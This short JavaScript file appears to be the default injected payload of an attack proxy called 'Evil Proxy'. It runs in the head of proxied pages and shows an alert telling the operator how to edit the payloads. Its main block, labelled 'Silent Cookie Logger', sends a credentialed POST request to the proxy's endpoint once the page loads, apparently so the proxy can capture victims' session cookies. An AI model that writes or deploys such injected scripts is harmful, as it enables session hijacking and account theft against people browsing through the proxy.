/*
REMEMBER! 
This file is run in the head tag, so make sure that your payloads are run after the body has loaded, if neceessary.
*/

alert('This is the default Evil Proxy payload. To edit, remove or add a payload, go to the root directory, and configure the evil-script.js script from the panel folder as you wish.')

/* Silent Cookie Logger (DEFAULT) */
document.addEventListener("DOMContentLoaded", function() {
    fetch('/ep/api/ping', { method: 'POST', credentials: 'include' });
});